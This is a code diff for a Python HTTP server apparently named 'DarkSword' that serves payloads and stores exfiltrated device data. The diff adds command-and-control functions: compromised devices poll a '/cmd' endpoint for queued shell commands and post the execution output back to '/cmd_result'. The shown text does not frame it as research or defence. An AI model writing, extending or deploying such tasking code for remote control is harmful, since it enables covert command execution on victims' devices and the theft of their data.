@@ -14,7 +14,7 @@ from .config import get_payloads_dir, get_templates_dir, ServeConfig
 EXFIL_DIR: Optional[Path] = None
 
 try:
-    from admin.database import SessionLocal, Log, Device, ExfilData
+    from admin.database import SessionLocal, Log, Device, ExfilData, Command
     DB_AVAILABLE = True
 except ImportError:
     DB_AVAILABLE = False
@@ -94,6 +94,39 @@ def save_exfil_to_db(device_uuid: str, category: str, path: str, description: st
         pass
 
 
+
+def get_pending_command(device_uuid: str):
+    if not DB_AVAILABLE:
+        return None
+    try:
+        db = SessionLocal()
+        command = db.query(Command).filter(
+            Command.device_uuid == device_uuid,
+            Command.status == 'pending'
+        ).order_by(Command.created_at).first()
+        if command:
+            command.status = 'executing'
+            db.commit()
+            db.close()
+            return {'id': command.id, 'command': command.command}
+        db.close()
+    except Exception:
+        pass
+    return None
+def update_command_result(command_id: int, output: str, status: str = 'completed'):
+    if not DB_AVAILABLE:
+        return None
+    try:
+        db = SessionLocal()
+        command = db.query(Command).filter(Command.id == command_id).first()
+        if command:
+            command.status = status
+            command.output = output
+            command.executed_at = datetime.now()
+            db.commit()
+            db.close()
+    except Exception:
+        pass
 def log_to_file(msg: str, log_path: Optional[Path] = None) -> None:
     """Write log message to file."""
     if log_path:
@@ -264,6 +297,22 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         else:
             file_path = None
 
+        if parsed.path.strip("/") == "cmd":
+            from urllib.parse import parse_qs
+            params = parse_qs(parsed.query)
+            device_uuid = params.get("device_uuid", [None])[0]
+            if device_uuid:
+                cmd = get_pending_command(device_uuid)
+                if cmd:
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(json.dumps(cmd).encode())
+                    return
+            self.send_response(204)
+            self.end_headers()
+            return
+
         if file_path and file_path.exists() and file_path.is_file():
             suffix = file_path.suffix.lower()
             content_types = {
@@ -286,6 +335,27 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         client_ip = self.client_address[0] if self.client_address else "unknown"
         user_agent = self.headers.get("User-Agent", "")
         
+        if parsed.path.strip("/") == "cmd_result":
+            request_log = f"POST /cmd_result from {client_ip} ({content_length} bytes)"
+            print(f"  [REQUEST] {request_log}")
+            log_to_file(request_log, self.log_path)
+            
+            try:
+                data = json.loads(body.decode("utf-8"))
+                command_id = data.get("id")
+                output = data.get("output", "")
+                status = data.get("status", "completed")
+                if command_id:
+                    update_command_result(command_id, output, status)
+            except:
+                pass
+            
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(b'{"status":"ok"}')
+            return
+            
         if parsed.path.strip("/") == "upload":
             request_log = f"POST /upload from {client_ip} ({content_length} bytes)"
             print(f"  [REQUEST] {request_log}")
